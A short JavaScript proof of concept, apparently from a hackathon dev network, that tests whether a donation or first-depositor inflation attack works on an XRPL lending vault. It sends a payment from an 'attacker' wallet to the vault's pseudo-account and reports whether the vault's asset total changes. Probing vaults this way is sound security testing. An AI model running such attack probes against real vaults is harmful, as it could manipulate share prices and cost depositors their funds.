/**
 * Classic first-depositor / donation inflation attack: can raw assets be pushed into the vault
 * (Payment to its pseudo-account) to inflate share price without minting shares?
 * HACK_SEEDS=mgr,lp,bor ; VAULT=<index>
 */
import { Client, Wallet } from 'xrpl'
const c=new Client('wss://lending-hackathon.dev.ripplex.io:51233'); await c.connect()
const NETID=(await c.request({command:'server_info'})).result.info.network_id
const seeds=process.env.HACK_SEEDS.split(','); const V=process.env.VAULT
const mgr=Wallet.fromSeed(seeds[0]), attacker=Wallet.fromSeed(seeds[2])
const vault=async()=>(await c.request({command:'ledger_entry',index:V})).result.node
const v=await vault(); const pseudo=v.Account
console.log('vault pseudo-account:', pseudo)
console.log('AssetsTotal before:', v.AssetsTotal)
try{
  const r=await c.submitAndWait({TransactionType:'Payment',Account:attacker.address,Destination:pseudo,Amount:'5000000',NetworkID:NETID},{autofill:true,wallet:attacker})
  console.log('Payment to vault pseudo-account:', r.result.meta.TransactionResult)
}catch(e){ console.log('Payment threw:', e?.data?.error_message??e.message) }
const v2=await vault()
console.log('AssetsTotal after: ', v2.AssetsTotal, v2.AssetsTotal===v.AssetsTotal?'(unchanged => donation does NOT inflate)':'(CHANGED!)')
await c.disconnect()
